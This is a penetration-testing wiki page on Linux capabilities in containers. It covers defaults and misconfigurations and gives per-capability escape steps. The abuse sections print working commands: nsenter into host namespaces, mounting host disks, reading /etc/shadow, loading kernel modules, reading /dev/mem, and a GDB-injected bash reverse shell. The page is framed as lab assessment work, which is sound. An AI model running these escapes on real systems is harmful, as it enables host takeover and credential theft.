# Linux Capabilities In Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

Linux capabilities are one of the most important pieces of container security because they answer a subtle but fundamental question: **what does "root" really mean inside a container?** On a normal Linux system, UID 0 historically implied a very broad privilege set. In modern kernels, that privilege is decomposed into smaller units called capabilities. A process may run as root and still lack many powerful operations if the relevant capabilities have been removed. <sup>[[1]](#references)</sup>

Containers depend on this distinction heavily. Many workloads are still launched as UID 0 inside the container for compatibility or simplicity reasons. Without capability dropping, that would be far too dangerous. With capability dropping, a containerized root process can still perform many ordinary in-container tasks while being denied more sensitive kernel operations. That is why a container shell that says `uid=0(root)` does not automatically mean "host root" or even "broad kernel privilege". The capability sets decide how much that root identity is actually worth.

For the full Linux capability reference and many abuse examples, see:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Operation

Capabilities are tracked in several sets, including permitted, effective, inheritable, ambient, and bounding sets. For many container assessments, the exact kernel semantics of each set are less immediately important than the final practical question: **which privileged operations can this process successfully perform right now, and which future privilege gains are still possible?** <sup>[[1]](#references)</sup>

The reason this matters is that many breakout techniques are really capability problems disguised as container problems. A workload with `CAP_SYS_ADMIN` can reach a huge amount of kernel functionality that a normal container root process should not touch. A workload with `CAP_NET_ADMIN` becomes much more dangerous if it also shares the host network namespace. A workload with `CAP_SYS_PTRACE` becomes much more interesting if it can see host processes through host PID sharing. In Docker or Podman that may appear as `--pid=host`; in Kubernetes it usually appears as `hostPID: true`.

In other words, the capability set cannot be evaluated in isolation. It has to be read together with namespaces, seccomp, and MAC policy.

## Lab

A very direct way to inspect capabilities inside a container is:

```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```

You can also compare a more restrictive container with one that has all capabilities added:

```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

To see the effect of a narrow addition, try dropping everything and adding back only one capability:

```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

These small experiments help show that a runtime is not simply toggling a boolean called "privileged". It is shaping the actual privilege surface available to the process.

## High-Risk Capabilities

Capabilities become escape primitives only when their operation reaches a **host-governed resource**. The recurring high-risk combinations are:

- **`CAP_SYS_ADMIN`** plus a host PID, block device, or writable kernel-control path. Joining a target mount namespace additionally requires `CAP_SYS_CHROOT`; mounting a block-based filesystem requires `CAP_SYS_ADMIN` in the initial user namespace.
- **`CAP_SYS_PTRACE`** plus host PID visibility and an attachable host process. `CAP_SYS_ADMIN` is not required for ptrace injection.
- **`CAP_DAC_OVERRIDE` or `CAP_DAC_READ_SEARCH`** plus a reachable host filesystem. These capabilities bypass different DAC checks but do not create a host filesystem view.
- **`CAP_SYS_MODULE`** in the initial user namespace plus an accepted, kernel-compatible module. Ordinary Linux containers share the node kernel; VM or userspace-kernel runtimes change that boundary.
- **`CAP_MKNOD`** in the initial user namespace plus a real host device that the device cgroup already permits. Creating a node does not bypass the device cgroup.
- **`CAP_SYS_RAWIO`** plus an exposed and usable memory, I/O-port, PCI, or device-control interface.
- **`CAP_SYS_BOOT`** plus the initial PID namespace for a host reboot, or a usable and permitted kexec path for kernel replacement.
- **`CAP_NET_ADMIN`** in the host network namespace for direct node network-state control. **`CAP_NET_RAW`** can participate in a protocol-specific escape, but raw sockets alone are not a node shell.

`CAP_SYS_CHROOT` is deliberately not listed as a standalone escape capability. It can be required by mount-namespace `setns()` and can make an already accessible host tree easier to use, but `chroot()` alone neither exposes that tree nor grants new filesystem permissions. Likewise, `CAP_BPF` and `CAP_PERFMON` expose powerful telemetry and kernel attack surface, but absent a separate kernel flaw their ordinary operations are not generic container escapes.

## Runtime Usage

Docker, Podman, containerd-based stacks, and CRI-O all use capability controls, but the defaults and management interfaces differ. Docker exposes them directly through flags such as `--cap-drop` and `--cap-add`. Podman exposes similar controls and commonly combines them with rootless execution as an additional safety layer. Kubernetes surfaces capability additions and drops through the Pod or container `securityContext`; lower-level runtimes express the resulting sets in the OCI runtime configuration. System-container environments such as LXC and Incus also rely on capability control, but their broader host integration can tempt operators to relax defaults more aggressively than they would for an application container. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

The same principle holds across all of them: a capability that is technically possible to grant is not necessarily one that should be granted. Many real-world incidents begin when an operator adds a capability simply because a workload failed under a stricter configuration and the team needed a quick fix.

## Misconfigurations

The most obvious mistake is **`--cap-add=ALL`** in Docker/Podman-style CLIs, but it is not the only one. In practice, a more common problem is granting one or two extremely powerful capabilities, especially `CAP_SYS_ADMIN`, to "make the application work" without also understanding the namespace, seccomp, and mount implications. Another common failure mode is combining extra capabilities with host namespace sharing. In Docker or Podman this may appear as `--pid=host`, `--network=host`, or `--userns=host`; in Kubernetes the equivalent exposure usually appears through workload settings such as `hostPID: true` or `hostNetwork: true`. Each of those combinations changes what the capability can actually affect.

It is also common to see administrators believe that because a workload is not fully `--privileged`, it is still meaningfully constrained. Sometimes that is true, but sometimes the effective posture is already close enough to privileged that the distinction stops mattering operationally.

## Abuse

Start by recording the effective sets, user-namespace mapping, seccomp state, namespaces, mounts, and devices. A capability name without this context does not prove an escape:

```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```

### `CAP_SYS_ADMIN`: namespaces and block devices

With host PID visibility, `CAP_SYS_ADMIN` can enter host namespaces. The mount-namespace operation also needs `CAP_SYS_CHROOT` in the caller's user namespace.

**Check the capability and confinement:**

```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```

**Enumerate the target:** confirm host PID sharing from the container/Pod configuration or an unmistakable host process list, then inspect the target namespaces. A local PID 1 exists in private PID namespaces too, so its presence alone does not prove host PID sharing.

```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```

**Exploit the namespace path:**

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```

The capability checks must succeed in the user namespaces that own the targets. `--pid=host` or Kubernetes `hostPID: true` supplies visibility; it does not supply the capabilities.

For the alternative block-device path, **enumerate** the candidates, then **exploit** the accessible filesystem by mounting the validated candidate read-only first:

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```

The device node must exist, the device cgroup must allow it, and block-filesystem mounts require `CAP_SYS_ADMIN` in the initial user namespace. A host root already bind-mounted at `/host` is host access **without** `CAP_SYS_ADMIN`; `chroot /host` is only a convenience and separately requires `CAP_SYS_CHROOT`.

### Reachable host root: direct filesystem execution

If the host root is already mounted at `/host`, first confirm the mount and then use the existing access directly. This path does not depend on `CAP_SYS_ADMIN`:

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```

If `chroot()` is unavailable but the host binary is compatible with the container's architecture and loader, it can often be called through the mounted tree instead:

```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```

Direct reads and writes under `/host` are already host-filesystem compromise. `chroot()` or executing a host binary only makes that access more convenient; neither operation creates the host mount or bypasses a read-only mount or MAC policy.

### `CAP_SYS_PTRACE`: host-process injection

With host PID visibility and `CAP_SYS_PTRACE` in the target's user namespace, GDB can make an approved host process call `system()`. `CAP_SYS_ADMIN` is not required.

**Check the capability and attachment controls:**

```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```

**Enumerate and select a disposable target:** confirm host PID sharing from configuration or an unmistakable node process list; never select PID 1 or a critical daemon.

```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
  "/proc/${target_pid}/status"
```

**Exploit the selected process:**

```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
  -ex detach
```

The target must be attachable and have a usable `system()` symbol and Bash payload path. Yama, non-dumpable state, seccomp, user namespaces, and MAC policy can block the chain. GDB stops the target while attached, so use only a disposable lab process.

### `CAP_DAC_OVERRIDE` and `CAP_DAC_READ_SEARCH`: protected host files

These capabilities do not expose the host filesystem. If `/host` is already a host mount, `CAP_DAC_READ_SEARCH` can bypass read/search DAC checks and `CAP_DAC_OVERRIDE` can additionally bypass ordinary write checks:

**Check the capabilities:**

```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Enumerate the exposed host filesystem and target permissions:**

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```

**Exercise the read and write bypasses** in a disposable lab:

```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```

A read-only mount and LSM rules still apply. `CAP_DAC_READ_SEARCH` also authorizes `open_by_handle_at()`, but a breakout such as Shocker additionally needs a mount file descriptor for the same underlying filesystem, valid or discoverable handles, a compatible filesystem/storage layout, and no runtime or LSM block. It does not provide arbitrary access to every filesystem outside the mount namespace.

### `CAP_SYS_MODULE`: shared-kernel execution

In an ordinary Linux container, an accepted module runs in the shared host kernel.

**Check the capability and user-namespace scope:**

```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Enumerate module-loading prerequisites:**

```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
  "/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```

**Exploit only with a compatible, pre-reviewed proof module on a disposable node:**

```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```

The capability must be effective in the initial user namespace. Kernel version and configuration, module signatures, lockdown, seccomp, and LSM policy must permit the load. Kata, gVisor, Hyper-V isolation, and similar runtimes change which kernel boundary the workload reaches.

### `CAP_MKNOD`: create a permitted device handle

`CAP_MKNOD` creates a device node but does not bypass the device cgroup. Device creation is not namespaced, so the capability must be effective in the initial user namespace.

**Check the capability and user-namespace scope:**

```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Enumerate the real devices, their major/minor numbers, and any visible cgroup-v1 allowlist:**

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```

**Exploit a validated ext-family candidate read-only:**

```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Other filesystems need a matching read-only tool; mounting the device additionally needs `CAP_SYS_ADMIN`. `Operation not permitted` when opening the created node usually indicates the device cgroup still blocks it. Under cgroup v2, device access is commonly enforced with BPF and no `devices.list` file exists, so a successful open is the decisive test.

### `CAP_SYS_RAWIO`: exposed raw-I/O interface

There is no portable generic payload: valid addresses and effects depend on hardware and kernel configuration.

**Check the capability and user-namespace scope:**

```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Enumerate exposed raw interfaces, hardware, and drivers:**

```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

**Exploit only with an approved proof for the identified device and address range.** If `/dev/mem` is the lab-approved interface, this template proves node-memory disclosure without printing its contents:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

The address must come from the lab's hardware map because reading some MMIO regions can have side effects. A generic memory-write command would be misleading and unsafe: the same address can be harmless on one machine and control hardware or kernel memory on another. Device cgroups, filesystem permissions, strict `/dev/mem`, kernel lockdown, virtualization, and LSM policy commonly prevent useful access.

### `CAP_SYS_BOOT`: namespace reboot or kernel replacement

In a private PID namespace, `reboot()` terminates that namespace's init process rather than rebooting the host. Host reboot impact therefore needs the initial PID namespace, normally through host PID sharing. A kexec path also needs a compatible kernel image and permissive lockdown/signature policy:

**Check the capability:**

```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Enumerate the PID-namespace and kexec prerequisites:** confirm host PID sharing from the workload configuration because a PID namespace link alone does not reveal whether it is the node's initial namespace.

```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

**Exploit only when rebooting a disposable lab node is the explicit exercise:**

```bash
sync
reboot -f
```

Do not issue that command or load a kernel on a shared node merely to prove the capability. In a private PID namespace it terminates only that namespace's init process and does not demonstrate host impact.

### `CAP_NET_ADMIN` and `CAP_NET_RAW`: host network paths

`CAP_NET_ADMIN` affects only the current network namespace.

**Check the capabilities and confinement:**

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Enumerate the current network and confirm host networking from the workload configuration:**

```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```

**Exercise `CAP_NET_ADMIN` reversibly:** with host networking, the temporary interface is a node interface.

```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```

`CAP_NET_RAW` permits RAW and PACKET sockets but is not a generic host shell. To **enumerate** the documented GCE chain, check the metadata route and capture whether plaintext guest-agent traffic is observable:

```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```

If the matching prerequisites exist, **exploit** the environment-specific chain as documented in [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): capture the request and sequence state, inject the forged metadata response containing an SSH key, then validate host access. The chain required root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, plaintext GCE metadata traffic, and a raceable guest-agent request; modern transport or agent behavior can break it.

## Checks

The goal of the capability checks is not only to dump raw values but to understand whether the process has enough privilege to make its current namespace and mount situation dangerous.

```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```

What is interesting here:

- `capsh --print` is the easiest way to spot high-risk capabilities such as `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, or `cap_sys_module`.
- The `CapEff` line in `/proc/self/status` tells you what is actually effective now, not just what might be available in other sets.
- A capability dump becomes much more important if the container also shares host PID, network, or user namespaces, or has writable host mounts.

After collecting the raw capability information, the next step is interpretation. Ask whether the process is root, whether user namespaces are active, whether host namespaces are shared, whether seccomp is enforcing, and whether AppArmor or SELinux still restricts the process. A capability set by itself is only part of the story, but it is often the part that explains why one container breakout works and another fails with the same apparent starting point.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Reduced capability set by default | Docker keeps a default allowlist of capabilities and drops the rest | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Reduced capability set by default | Podman containers are unprivileged by default and use a reduced capability model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Inherits runtime defaults unless changed | If no `securityContext.capabilities` are specified, the container gets the default capability set from the runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Usually runtime default | The effective set depends on the runtime plus the Pod spec | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

For Kubernetes, the important point is that the API does not define one universal default capability set. If the Pod does not add or drop capabilities, the workload inherits the runtime default for that node.

## References

- [1] [capabilities(7) - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Linux container configuration](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - Runtime privilege and Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes Documentation - Set capabilities for a container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman documentation - `--cap-add` and `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus documentation - Security](https://linuxcontainers.org/incus/docs/main/explanation/security/)

{{#include ../../../../banners/hacktricks-training.md}}
